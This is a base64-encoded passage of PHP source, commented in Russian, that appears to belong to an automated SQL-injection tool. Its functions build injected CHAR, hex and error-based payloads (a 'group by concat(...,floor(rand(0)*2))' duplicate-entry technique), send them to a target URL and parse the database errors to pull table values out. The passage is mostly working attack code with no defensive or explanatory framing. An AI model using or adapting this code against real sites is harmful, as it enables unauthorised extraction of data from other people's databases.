XJldHVybiAkZGF0YTsKCQkJfQoJCQoJfQoJCglmdW5jdGlvbiBteXNxbEdldFZhbHVlU2xlZXBDSEFSKCRiZCwkdGFibGUsJHBvbGUsJGxpbWl0PTAsJG9yZGVyPWFycmF5KCksJHdoZXJlPScnKXsvL9C00L7Rh9C10YDQvdGP0Y8KCQkKCQkKCQlpZigkdGFibGUhPT0nJykKCQl7CgkJCWlmKCRiZD09JycpCgkJCXsKCQkJCSRmcm9tID0gJ0ZST00gJy4kdGFibGUuJyc7CgkJCX1lbHNlCgkJCXsKCQkJCSRmcm9tID0gJ0ZST00gJy4kYmQuJy4nLiR0YWJsZS4nJzsKCQkJfQoJCX1lbHNlCgkJewoJCQkkZnJvbSA9ICcnOwoJCX0KCQkKCQkgCgkJJG1ldGhvZCA9ICR0aGlzLT5zcG9zb2I7CgkJCgkJLy/QvdCw0YfQsNC70L4g0LvQuNC80LjRgtCwCgkJJGxpbWl0ID0gJGxpbWl0LicsMSc7CgkJCgkJJHF1ZXJ5ID0gIiI7Ly/QvdCw0YfQsNC70YzQvdGL0Lkg0LfQsNC/0YDQvtGBINC00LvRjyBzbGVlcAoJCQoJCSRrID0gJHRoaXMtPnNldFsnc2xlZXAnXVsnY29tZW50J107CgkJCgkJCgkJCgkJCgkJaWYoZW1wdHkoJGspIG9yICRrPT0nJykKCQl7CQoJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IGVtdHByeShrKSAnKTsKCQkJLy9yZXR1cm4gZmFsc2U7CgkJfQoJCQkgCgkJIGlmKCFpc19hcnJheSgkcG9sZSkpJHBvbGUgPSBhcnJheSgkcG9sZSk7Ly/RjdGC0L4g0LrQsNC6INGA0LDQtyDQvdCw0Ygg0LfQsNC/0YDQvtGBIHZlcnNpb24g0Log0L/RgNC40LzQtdGA0YMKCQkKCQkgJHphcHIgPSAnJzsvL9C+0LHRidCw0Y8g0YHRgtGA0L7QutCwINC00LvRjyDQvdCw0YjQuNGFINC/0L7Qu9C10LkKCQkgCgkJCgkJIAoJCS8v0L7QsdCy0L7Qu9Cw0LrQuNCy0LDQtdC8INC10LPQviDRgdC/0LXRhiDRgdC40LzQstC+0LvQsNC80LgsINGH0YLQvtCx0Ysg0L/QsNGC0L7QvCDQvdCw0LnRgtC4INC80L7QttC90L4g0LHRi9C70L4g0LHRiwoJCWZvcmVhY2ggKCRwb2xlIGFzICRrZXk9PiR2YWwpCgkJewoJICAJCgkJIAlpZihjb3VudCgkcG9sZSk9PTEpLy/QtdGB0LvQuCDQvtC00L3QviDQv9C+0LvQtQoJCQl7CgkJIAkJJHphcHIgLj0gJ0NIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1tYXScpLicpJy4nLCcuJHZhbC4nLENIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1tYWF0nKS4nKSc7CgkJIAkJCgkJIAl9ZWxzZQoJCQl7Ly/QtdGB0LvQuCDQvdC10YHQutC+0LvRjNC60L4g0L3QsNC50YLQuCDQvdCw0LTQvgoJCSAJCSR6YXByIC49ICcsQ0hBUignLiR0aGlzLT5jaGFyY2hlcignWycuJHZhbC4nXScpLicpJy4nLCcuJHZhbC4nLENIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1snLiR2YWwuJ10nKS4nKSc7CgkJIAl9CgkJfQoJICAKCQkvLyR0aGlzLT5kKCd0b2Noa2E6ICR6YXByICcuICR6YXByKTsKCQkvL2V4aXQ7CgkJCgkJICR3b3JrX2NvdW50ID0gY291bnQoJHRoaXMtPndvcmspOy8v0YDQsNCx0L7Rh9C40LUg0L/QvtC70Y8g0LPQtNC1INCy0YvQstC+0LQg0LXRgdGC0YwKCQkKCQkvLyR0aGlzLT5kKCR0aGlzLT53b3JrLCckd29ya19jb3VudCcpOwoJCS8vZXhpdDsKCQkKCQkgJG5ldyA9IGFycmF5KCk7IC8vINCn0YLQviDQvdCwINCy0YvRhdC+0LQKCQkgJGdpdmUgPSAwOwoJCSAKCQkKCQkvL2lmKCR0aGlzLT5kdW1wZmlsZT09dHJ1ZSkKCQkvL3sKCQkJLy8kcXVlcnkgPSAkemFwcjsKCQkvL30KCQkvL2Vsc2V7CgkJCgkJCgkJaWYoJG9yZGVyIT09YXJyYXkoKSBBTkQgY291bnQoJHBvbGUpPjEpCgkJewoJCQkkb3JkZXIyID0gJyBvcmRlciBieSBgJy4kb3JkZXJbMF0uJ2AgJy4kb3JkZXJbMV0uJyAnOwoJCX1lbHNlCgkJewoJCQkkb3JkZXIyID0gJyAnOwoJCX0KCQkKCQkgLy/Qv9C+0LTRgdGC0LDQstC70Y/QtdC8INC60L7Qu9C+0L3QutC4CgkJIGZvcigkY29sPTE7JGNvbDw9JHRoaXMtPmNvbHVtbjskY29sKyspCgkJCXsKCQkJCQoJCQkJaWYoJGNvbD09MSl7JHphcD0nJzt9ZWxzZXskemFwPScsJzt9Ly/Qt9Cw0L/Rj9GC0LDRjwoJCQkKCQkJCWlmKGluX2FycmF5KCRjb2wsICR0aGlzLT53b3JrKSBBTkQgJGdpdmU9PTApCgkJCQl7CgkJCQkJJHAgPSAkY29sLTE7CgoJCQkJCSRnaXZlKys7CgkJCQkJJHF1ZXJ5IC49ICR6YXAuIihzZWxlY3QgQ09OQ0FUKENIQVIoIi4kdGhpcy0+Y2hhcmNoZXIoJ2RkZCcpLiIpLCR6YXByKSIuJyAnLiRmcm9tLicgJy4kd2hlcmUuJyAnLiRvcmRlcjIuJyBsaW1pdCAnLiRsaW1pdC4iICkiOwoJCQkJCQoJCQkJCS8vJHF1ZXJ5IC49ICR6YXAuIkNPTkNBVChDSEFSKCIuJHRoaXMtPmNoYXJjaGVyKCdkZGQnKS4iKSwkemFwcikiOwoJCQkJCQoJCQkJfWVsc2UKCQkJCXsKCQkJCQkJCgkJCQkJaWYoJG9yZGVyIT09YXJyYXkoKSBBTkQgY291bnQoJHBvbGUpPjEpCgkJCQkJewoJCQkJCQkkcXVlcnkgLj0gJHphcC4iIi4kb3JkZXJbMF07CgkJCQkJfWVsc2UKCQkJCQl7CgkJCQkJCSRxdWVyeSAuPSAkemFwLiRjb2w7CQoJCQkJCX0KCQkJCX0KCQkJCQkKCQkJfQoJCS8vfQkKCQkJLy8kdGhpcy0+ZCgkcXVlcnksJyRxdWVyeScpOwoJCQkvL2V4aXQ7CgkKCQkJCS8vLiRmcm9tLicgJy4kd2hlcmUuJG9yZGVyLidsaW1pdCAnLiRsaW1pdAoJCQkJJHEgPSAkcXVlcnkuJyAnOwoJCQkJJHEgPSBzdHJfcmVwbGFjZSgnLCwnLCAnLCcsJHEpOwoJCQkJJHEgPSBzdHJfcmVwbGFjZSgnICAnLCAnICcsJHEpOwoJCQkJCgkJCQoJCQkJCgkJCQkKCQkJCQoJCQkJCgkJCQkvLyRzc3MgPSAkdGhpcy0+bXlzcWxEdW1wZXJGaWx0ZXIoJ1NFbGVDVCAnLiRxKTsKCQkJCQoJCQkJJGZpbGUgPSAkdGhpcy0+c2VuZF9zcWwoJ1NFbGVDVCAnLiRxLGZhbHNlKTsKCQkJCS8vZXhpdDsKCQkJCQoJCQkJCgkJCQlpZigkdGhpcy0+aGVhZF9lbmFibGU9PXRydWUpewoJCQkJCQoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGVfc2xlZXBfaGVhZC50eHQnLCRmaWxlKTsKCQkJCX1lbHNlewoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGVfc2xlZXAudHh0JywkZmlsZSk7CgkJCQl9CgkJCQkKCQkJCS8vJHRoaXMtPmQoJHEsJyRxJyk7CgkJCQkKCQkJCS8vJHRoaXMtPmQoJGZpbGUsJyRmaWxlJyk7CQoJCQkJCgkJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IHNlbmRfc3FsLSAgJy4nU0VsZUNUICcuJHEpOwoJCQkJCgkJCQkKCQkJCSR0aGlzLT5maWxlID0gJGZpbGU7CgkJCQkKCQkJCWlmKCR0aGlzLT5kdW1wZmlsZT09dHJ1ZSkKCQkJCXsKCQkJCQkKCQkJCQkvL3JldHVybiAkZmlsZTsKCQkKCQkJCX0KCQkJCQoKCQkJCgkJCQkKCQkJCS8v0LjRidC10Lwg0YDQtdC30YPQu9GM0YLQsNGC0YsJCgkJCQlpZihjb3VudCgkcG9sZSk9PTEpIC8v0LXRgdC70Lgg0L7QvSDQvtC00LjQvSDQv9GA0LXQtNC/0L7Qu9Cw0LPQsNC10YLRgdGPCgkJCQl7CgkJCQkJcHJlZ19tYXRjaF9hbGwoInxcW1hcXSguKj8pXFtYWFxdfGkiLCRmaWxlLCRhcnIpOwoJCQkJCQoJCQkJCS8vJHRoaXMtPmQoJGFyclsxXVswXSwnJGFyclsxXVswXScpOwoKCQkJCQlpZihpc3NldCgkYXJyWzFdWzBdKSlyZXR1cm4gYXJyYXkoJHBvbGVbMF09PiRhcnJbMV1bMF0pOwoJCQkJCQoJCQkJCXJldHVybiBmYWxzZTsKCQkgCQkKCQkJCX1lbHNlLy/QtdGB0LvQuCDQvdC1INGB0LrQvtC70YzQutC+INC/0L7Qu9C10Lkg0LHRi9C70L4KCQkJCXsKCQkgCQkJCQoJCQkJCWZvcmVhY2ggKCRwb2xlIGFzICR2YWwpCgkJCQkJewoJCQkJCQlwcmVnX21hdGNoX2FsbCgifFxbeyR2YWx9XF0oLio/KVxbeyR2YWx9XF18aSIsJGZpbGUsJGFycik7CgkJCQkKCQkJCQkJaWYoaXNzZXQoJGFyclsxXVswXSkpCgkJCQkJCXsKCQkJCQkJCSRleHBvcnRbJHZhbF0gPSAkYXJyWzFdWzBdOwoJCQkJCQl9ZWxzZQoJCQkJCQl7CgkJCQkJCQkkZXhwb3J0WyR2YWxdID0gJyc7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCQoJCQkKCQkJCgkJCQlpZihpc3NldCgkZXhwb3J0KSkKCQkJCXsJCgkJCQkJcmV0dXJuICRleHBvcnQ7CgkJCQl9CgkJCQkKCQkJCXJldHVybiBmYWxzZTsKCQkKCgl9CgkKCWZ1bmN0aW9uIG15c3FsR2V0VmFsdWVTbGVlcEhFWCgkYmQsJHRhYmxlLCRwb2xlLCRsaW1pdD0wLCRvcmRlcj1hcnJheSgpLCR3aGVyZT0nJyl7Ly/QtNC+0YfQtdGA0L3Rj9GPCgkJCgkJCgkJaWYoJHRhYmxlIT09JycpCgkJewoJCQlpZigkYmQ9PScnKQoJCQl7CgkJCQkkZnJvbSA9ICdGUk9NICcuJHRhYmxlLicnOwoJCQl9ZWxzZQoJCQl7CgkJCQkkZnJvbSA9ICdGUk9NICcuJGJkLicuJy4kdGFibGUuJyc7CgkJCX0KCQl9ZWxzZQoJCXsKCQkJJGZyb20gPSAnJzsKCQl9CgkJCgkJIAoJCSRtZXRob2QgPSAkdGhpcy0+c3Bvc29iOwoJCQoJCS8v0L3QsNGH0LDQu9C+INC70LjQvNC40YLQsAoJCSRsaW1pdCA9ICRsaW1pdC4nLDEnOwoJCQoJCSRxdWVyeSA9ICIiOy8v0L3QsNGH0LDQu9GM0L3Ri9C5INC30LDQv9GA0L7RgSDQtNC70Y8gc2xlZXAKCQkKCQkkayA9ICR0aGlzLT5zZXRbJ3NsZWVwJ11bJ2NvbWVudCddOwoJCQoJCQoJCQoJCQoJCWlmKGVtcHR5KCRrKSBvciAkaz09JycpCgkJewkKCQkJLy8kdGhpcy0+ZCgndG9jaGthOiBlbXRwcnkoaykgJyk7CgkJCS8vcmV0dXJuIGZhbHNlOwoJCX0KCQkJIAoJCSBpZighaXNfYXJyYXkoJHBvbGUpKSRwb2xlID0gYXJyYXkoJHBvbGUpOy8v0Y3RgtC+INC60LDQuiDRgNCw0Lcg0L3QsNGIINC30LDQv9GA0L7RgSB2ZXJzaW9uINC6INC/0YDQuNC80LXRgNGDCgkJCgkJICR6YXByID0gJyc7Ly/QvtCx0YnQsNGPINGB0YLRgNC+0LrQsCDQtNC70Y8g0L3QsNGI0LjRhSDQv9C+0LvQtdC5CgkJIAoJCQoJCSAKCQkvL9C+0LHQstC+0LvQsNC60LjQstCw0LXQvCDQtdCz0L4g0YHQv9C10YYg0YHQuNC80LLQvtC70LDQvNC4LCDRh9GC0L7QsdGLINC/0LDRgtC+0Lwg0L3QsNC50YLQuCDQvNC+0LbQvdC+INCx0YvQu9C+INCx0YsKCQlmb3JlYWNoICgkcG9sZSBhcyAka2V5PT4kdmFsKQoJCXsKCSAgCQoJCSAJaWYoY291bnQoJHBvbGUpPT0xKS8v0LXRgdC70Lgg0L7QtNC90L4g0L/QvtC70LUKCQkJewoJCQkJCgkJCQkvLyAgJHphcHIgLj0gIjB4NWUsSUZOVUxMKGNhc3QoJHZhbCBhcyBjaGFyKSwnICcpLDB4NWUsIjsKCQkJCSR6YXByIC49ICJJRk5VTEwodW5oZXgoSGV4KGNhc3QoJHZhbCBhcyBjaGFyKSkpLCcgJykiOwoJCQkJCgkJIAkJLy8kemFwciAuPSAnQ0hBUignLiR0aGlzLT5jaGFyY2hlcignW1hdJykuJyknLicsJy4kdmFsLicsQ0hBUignLiR0aGlzLT5jaGFyY2hlcignW1hYXScpLicpJzsKCQkgCQkKCQkgCX1lbHNlCgkJCXsvL9C10YHQu9C4INC90LXRgdC60L7Qu9GM0LrQviDQvdCw0LnRgtC4INC90LDQtNC+CgkJCQkvLyR6YXByIC49ICIweDVlLHVuaGV4KEhleChjYXN0KCR2YWwgYXMgY2hhcikpKSwweDVlLCI7CgkJCQkkemFwciAuPSAiMHg1ZSxJRk5VTEwodW5oZXgoSGV4KGNhc3QoJHZhbCBhcyBjaGFyKSkpLCcgJyksMHg1ZSwiOwoJCQkJLy8kemFwciAuPSAnLENIQVIoJy4kdGhpcy0+Y2hhcmNoZXIoJ1snLiR2YWwuJ10nKS4nKScuJywnLiR2YWwuJyxDSEFSKCcuJHRoaXMtPmNoYXJjaGVyKCdbJy4kdmFsLiddJykuJyknOwoJCSAJfQoJCX0KCSAgCgkJLy8kdGhpcy0+ZCgndG9jaGthOiAkemFwciAnLiAkemFwcik7CgkJLy9leGl0OwoJCQoJCSAkd29ya19jb3VudCA9IGNvdW50KCR0aGlzLT53b3JrKTsvL9GA0LDQsdC+0YfQuNC1INC/0L7Qu9GPINCz0LTQtSDQstGL0LLQvtC0INC10YHRgtGMCgkJCgkJLy8kdGhpcy0+ZCgkdGhpcy0+d29yaywnJHdvcmtfY291bnQnKTsKCQkvL2V4aXQ7CgkJCgkJICRuZXcgPSBhcnJheSgpOyAvLyDQp9GC0L4g0L3QsCDQstGL0YXQvtC0CgkJICRnaXZlID0gMDsKCQkgCgkJCgkJLy9pZigkdGhpcy0+ZHVtcGZpbGU9PXRydWUpCgkJLy97CgkJCS8vJHF1ZXJ5ID0gJHphcHI7CgkJLy99CgkJLy9lbHNlewoJCQoJCSBpZigkb3JkZXIhPT1hcnJheSgpIEFORCBjb3VudCgkcG9sZSk+MSkKCQkJewoJCQkJJG9yZGVyMiA9ICcgb3JkZXIgYnkgYCcuJG9yZGVyWzBdLidgICcuJG9yZGVyWzFdLicgJzsKCQkJfWVsc2UKCQkJewoJCQkJJG9yZGVyMiA9ICcnOwoJCQl9CgkJCQoJCQkKCQlpZigkdGhpcy0+ZGVzYyA9PTAgQU5EICR0aGlzLT5kZXNjX2VuYWJsZSA9PSB0cnVlKQoJCQl7CQoJCQkJJG9yZGVyMiA9ICdPUkRFUiBieSBpZCBERVNDJzsKCQkJfQoJCQkKCQkKCQkKCQkKCQkgLy/Qv9C+0LTRgdGC0LDQstC70Y/QtdC8INC60L7Qu9C+0L3QutC4CgkJIGZvcigkY29sPTE7JGNvbDw9JHRoaXMtPmNvbHVtbjskY29sKyspCgkJCXsKCQkJCQoJCQkJaWYoJGNvbD09MSl7JHphcD0nJzt9ZWxzZXskemFwPScsJzt9Ly/Qt9Cw0L/Rj9GC0LDRjwoJCQkKCQkJCWlmKGluX2FycmF5KCRjb2wsICR0aGlzLT53b3JrKSBBTkQgJGdpdmU9PTApCgkJCQl7CgkJCQkJJHAgPSAkY29sLTE7CgoJCQkJCSRnaXZlKys7CgkJCQkJCgkJCQkJCgkJCQkJJGhoID0gJHRoaXMtPnN0cnRvaGV4KCdbZGRkXScpOwoJCQkJCQoJCQkJCSRxdWVyeSAuPSAkemFwLiIoc2VsZWN0IENPTkNBVCgkaGgsJHphcHIsJGhoKSIuJyAnLiRmcm9tLicgJy4kd2hlcmUuJyAnLiRvcmRlcjIuJyBsaW1pdCAnLiRsaW1pdC4nKSc7CgkJCQkJCgkJCQkJCgkJCQkJLy8kcXVlcnkgLj0gJHphcC4iQ09OQ0FUKENIQVIoIi4kdGhpcy0+Y2hhcmNoZXIoJ2RkZCcpLiIpLCR6YXByKSI7CgkJCQkJCgkJCQl9ZWxzZQoJCQkJewoJCQkJCQkKCQkJCQlpZigkb3JkZXIhPT1hcnJheSgpIEFORCBjb3VudCgkcG9sZSk+MSkKCQkJCQl7CgkJCQkJCSRxdWVyeSAuPSAkemFwLiIiLiRvcmRlclswXTsKCQkJCQl9ZWxzZQoJCQkJCXsKCQkJCQkJJHF1ZXJ5IC49ICR6YXAuJGNvbDsJCgkJCQkJfQoJCQkJfQoJCQkJCQoJCQl9CgkJLy99CQoJCQkvLyR0aGlzLT5kKCRxdWVyeSwnJHF1ZXJ5Jyk7CgkJCS8vZXhpdDsKCQoJCQoKCQkJCSRxID0gJHF1ZXJ5LicgJzsKCQkJCSRxID0gc3RyX3JlcGxhY2UoJywsJywgJywnLCRxKTsKCQkJCSRxID0gc3RyX3JlcGxhY2UoJyAgJywgJyAnLCRxKTsKCQkJCQoJCQkKCQkJCQoJCQkJLy8kdGhpcy0+c2V0WydzbGVlcCddWydoZXgnXT10cnVlOwoJCQkJCgkJCQkKCQkJCS8vJHNzcyA9ICR0aGlzLT5teXNxbER1bXBlckZpbHRlcignU0VsZUNUICcuJHEpOwoJCQkJCgkJCQkkZmlsZSA9ICR0aGlzLT5zZW5kX3NxbCgnU0VsZUNUICcuJHEsZmFsc2UpOwoJCQkJLy9leGl0OwoJCQkJCgkJCQlpZigkdGhpcy0+aGVhZF9lbmFibGU9PXRydWUpewoJCQkJCQoJCQkJCWZpbGVfcHV0X2NvbnRlbnRzKCcuL2ZpbGVfc2xlZXBfaGVhZF9oZXgudHh0JywkZmlsZSk7CgkJCQl9ZWxzZXsKCQkJCQlmaWxlX3B1dF9jb250ZW50cygnLi9maWxlX3NsZWVwX2hleC50eHQnLCRmaWxlKTsKCQkJCX0KCQkJCQoJCQkJCgkJCQkKCQkJCS8vJHRoaXMtPmQoJHEsJyRxJyk7CgkJCQkKCQkJCS8vJHRoaXMtPmQoJGZpbGUsJyRmaWxlJyk7CQoJCQkJCgkJCQkvLyR0aGlzLT5kKCd0b2Noa2E6IHNlbmRfc3FsLSAgJy4nU0VsZUNUICcuJHEpOwoJCQkJCgkJCQkKCQkJCSR0aGlzLT5maWxlID0gJGZpbGU7CgkJCQkKCQkJCWlmKCR0aGlzLT5kdW1wZmlsZT09dHJ1ZSkKCQkJCXsKCQkJCQkKCQkJCQkvL3JldHVybiAkZmlsZTsKCQkKCQkJCX0KCQkJCQoKCQkJCgkJCQkKCQkJCS8v0LjRidC10Lwg0YDQtdC30YPQu9GM0YLQsNGC0YsJCgkJCQlpZihjb3VudCgkcG9sZSk9PTEpIC8v0LXRgdC70Lgg0L7QvSDQvtC00LjQvSDQv9GA0LXQtNC/0L7Qu9Cw0LPQsNC10YLRgdGPCgkJCQl7CgkJCQkJLy9wcmVnX21hdGNoX2FsbCgiL1xbWFxdKC4qPylcW1hYXF0vaXMiLCRmaWxlLCRhcnIpOwoJCQkJCSAgcHJlZ19tYXRjaF9hbGwoInxcW2RkZFxdKC4qPylcW2RkZFxdfGkiLCRmaWxlLCRhcnIpOwoJCQkJCS8vJHRoaXMtPmQoJGFyclsxXVswXSwnJGFyclsxXVswXScpOwoKCQkJCQlpZihpc3NldCgkYXJyWzFdWzBdKSlyZXR1cm4gYXJyYXkoJHBvbGVbMF09PiRhcnJbMV1bMF0pOwoJCQkJCQoJCQkJCXJldHVybiBmYWxzZTsKCQkgCQkKCQkJCX1lbHNlLy/QtdGB0LvQuCDQvdC1INGB0LrQvtC70YzQutC+INC/0L7Qu9C10Lkg0LHRi9C70L4KCQkJCXsKCQkgCQkJCQoJCQkJCQlwcmVnX21hdGNoX2FsbCgifFxbZGRkXF0oLio/KVxbZGRkXF18aSIsJGZpbGUsJGFycik7CgkJCQkJCQoJCQkJCQkvL3ByZWdfbWF0Y2hfYWxsKCJ+XF4oLio/KVxefmlzIiwkYXJyMjJbMF0sJGFycik7CgkJCQkJCQoJCQkJCQkvLyR0aGlzLT5kKCJ+XFt7JHZhbH1cXSguKj8pXFt7JHZhbH1cXX5pUyIsJ3JlZyBBTEwnKTsKCQkJCQkJCgkJCQkJCS8vJHRoaXMtPmQoJGFyciwnYXJyQV9MTEwgUE9MRSBIRVgnKTsKCQkJCQkJCgkJCQkJCQoJCQkJCQkJCgkJCQkJCQoJCQkJCSRqPTE7CgkJCQkJCgkJCQkJZm9yZWFjaCAoJHBvbGUgYXMgJHZhbCkKCQkJCQl7CgkJCQkJCQoJCQkJCQkKCQkJCQkJCgkJCQkJCQoJCQkJCQkKCQkJCQoJCQkJCQlpZihpc3NldCgkYXJyWzFdWzBdKSkKCQkJCQkJewoJCQkJCQkJCgkJCQkJCQkkYXJyWzFdWzBdID0gc3RyX3JlcGxhY2UoJ15eJywnXicsJGFyclsxXVswXSk7CgkJCQkJCQkKCQkJCQkJCSRiID0gZXhwbG9kZSgnXicsJGFyclsxXVswXSk7CgkJCQkJCQkKCQkJCQkJCSRiX2JldyA9IGFycmF5X2ZpbHRlcigkYiwgZnVuY3Rpb24oJGVsZW1lbnQpIHsKCQkJCQkJCQlyZXR1cm4gIWVtcHR5KCRlbGVtZW50KTsKCQkJCQkJCX0pOwoJCQkJCQkJCgkJCQkJCQkKCQkJCQkJCS8vJHRoaXMtPmQoJGIsJ2InKTsKCQkJCQkJCS8vJHRoaXMtPmQoJGJfYmV3LCdiX25ldycpOwoJCQkJCQkJCgkJCQkJCQkkZXhwb3J0WyR2YWxdID0gJGJbJGpdOwoJCQkJCQl9ZWxzZQoJCQkJCQl7CgkJCQkJCQkkZXhwb3J0WyR2YWxdID0gJyc7CgkJCQkJCgoJCQkJCQl9CgkJCQkJCQoJCQkJCQkkaisrOwoJCQkJCQkKCQkJCQl9CgkJCQl9CgkJCQoJCQkKCQkJCgkJCQlpZihpc3NldCgkZXhwb3J0KSkKCQkJCXsJCgkJCQkJcmV0dXJuICRleHBvcnQ7CgkJCQl9CgkJCQkKCQkJCXJldHVybiBmYWxzZTsKCQkKCgl9CgkKCQoJCgkKCWZ1bmN0aW9uIG15c3FHZXRWYWx1ZUJ5RXJyb3IoJGJkLCR0YWJsZSwkcG9sZSwkbGltaXQ9MCwkb3JkZXI9YXJyYXkoKSwkd2hlcmU9Jycpey8v0LTQvtGH0LXRgNC90Y/RjwoJCQoJCS8vJHRoaXMtPmQoJ215c3FHZXRWYWx1ZUJ5RXJyb3IgTUVUSE9EJyk7CgkJCgkJJGxpbWl0ID0gJGxpbWl0LicsMSc7CgkJCgkJaWYoJHRhYmxlIT09JycpewoJCQkKCQkJJGZyb20gPSAnRlJPTSsnLiRiZC4nLicuJHRhYmxlLicnOwoJCQkKCQl9ZWxzZXsKCQkJJGZyb20gPSAnJzsKCQl9CgkJCgkJaWYoJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodD09MCkKCQl7CgkJCQkJCQkKCQkJJHVybCA9ICR0aGlzLT51cmwuJzE5OTk5OTk5OTk5Jy4kdGhpcy0+Z2V0X2J5X2Vycm9yLicrb3IrKHNlbGVjdCtjb3VudCgqKWZyb20oc2VsZWN0KzErdW5pb24rc2VsZWN0KzIrdW5pb24rc2VsZWN0KzMpeCtncm91cCtieStjb25jYXQoJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLid4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDEnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJyxmbG9vcihyYW5kKDApKjIpKSkrLS0rJy4kdGhpcy0+Z2V0X2J5X2Vycm9yLid4Jy4kdGhpcy0+Z2V0X2J5X2Vycm9yLic9Jy4kdGhpcy0+Z2V0X2J5X2Vycm9yLid4JzsKCQkJCgkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoJCQkvL2VjaG8gJHVybC4nPGJyLz4nOwoJCQkvLyR0aGlzLT5kKCR1cmwsJyR1cmwnKTsKCQkJCgkJCS8vJHRoaXMtPmQoJGZpbGUsJyRmaWxlJyk7CgkJCQoJCQkvLwlkaWUoKTsKCQkJCS8vW015U1FMXVtPREJDIDMuNTEgRHJpdmVyXVtteXNxbGQtNS41LjQ3LTArZGViOHUxXVVua25vd24gY29sdW1uICd4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDEnIGluICdncm91cCBzdGF0ZW0KCQkJcHJlZ19tYXRjaF9hbGwoIn5cRHVwbGljYXRlIGVudHJ5IFwnKC4qPylcJ35pcyIsJGZpbGUsJGFycik7CgkJCQoJCQkvLyR0aGlzLT5kKCRhcnIsJyRhcnIxJyk7CgkJCQoJCQlpZighaXNzZXQoJGFyclsxXVswXSkpewoJCQkJcHJlZ19tYXRjaF9hbGwoIn4oXHMpP1Vua25vd24gY29sdW1uIFwnKC4qPylcJyBpbn5pcyIsJGZpbGUsJGFycik7CgkJCQkvLyR0aGlzLT5kKCRhcnIsJyRhcnIyJyk7CgkJCX0KCQkJCgkJCQoJCQkvLy9EdXBsaWNhdGUgZW50cnkgJ3gxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDF4MXgxeDEnIGZvciBrZXkgMQoJCQkkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0ID0gc3Vic3RyX2NvdW50KCRhcnJbMV1bMF0sICd4MScpOwoJCQkkdGhpcy0+Z2V0X2J5X2Vycm9yX2xlZ2h0ID0gJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodCoyOwoJCQkKCQkJCgkJCS8vJHRoaXMtPmQoJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodCwnJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodCcpOwoJCQkvLyR0aGlzLT5kKCR0aGlzLT5nZXRfYnlfZXJyb3IsJyR0aGlzLT5nZXRfYnlfZXJyb3InKTsKCQkJCgkJCQoJCQkvL2VjaG8gJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodDsKCQkJLy9kaWUoJHRoaXMtPmdldF9ieV9lcnJvcl9sZWdodCk7CgkJfQoJCQoJCS8vcHJpbnRfcigkcG9sZSk7CgkJCgkJLy/QndGD0LbQvdCwINC/0YDQvtCy0LXRgNC60LAg0L3QsCBjb25jYXQg0LIg0LfQsNC/0YDQvtGB0LUKCQkKCQkvL9Cj0LfQvdCw0YLRjCDQutCw0LrQsNGPINC00LvQuNC90L0KCQkKCQkKCQkKCQkKCQkKCQlpZihpc19hcnJheSgkcG9sZSkpewoJCQkKCQkJZm9yZWFjaCAoJHBvbGUgYXMgJHZhbHVlKXsKCgkJCQkkdXJsID0gJHRoaXMtPnVybC4nMTk5OTk5OTk5OTknLiR0aGlzLT5nZXRfYnlfZXJyb3IuJytvcisoc2VsZWN0K2NvdW50KCopZnJvbShzZWxlY3QrMSt1bmlvbitzZWxlY3QrMit1bmlvbitzZWxlY3QrMyl4K2dyb3VwK2J5K2NvbmNhdCgoc2VsZWN0K2xlbmd0aCgnLiR2YWx1ZS4nKSsnLiRmcm9tIC4nKycuJHdoZXJlLicrbGltaXQrJy4kbGltaXQuJyksQ0hBUignLiR0aGlzLT5jaGFyY2hlcigifCIpLicpLGZsb29yKHJhbmQoMCkqMikpKSstLSsnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnLiR0aGlzLT5nZXRfYnlfZXJyb3IuJz0nLiR0aGlzLT5nZXRfYnlfZXJyb3IuJ3gnOwoJCQkJCQkJCQkKCQkJCSRmaWxlID0gJHRoaXMtPmdldENvbnRlbnRzKCR1cmwpOwoJCQkJCgkJCS8vCWVjaG8gJHVybC4nPGJyLz4nOwoJCQkJLy9lY2hvICRmaWxlLic8YnIvPic7CgkJCQkvL2RpZSgpOwoJCQkJcHJlZ19tYXRjaF9hbGwoIn5cRHVwbGljYXRlIGVudHJ5IFwnKC4qPylcfH5pcyIsJGZpbGUsJGFycik7CgoJCQkJLy9wcmludF9yKCRhcnIp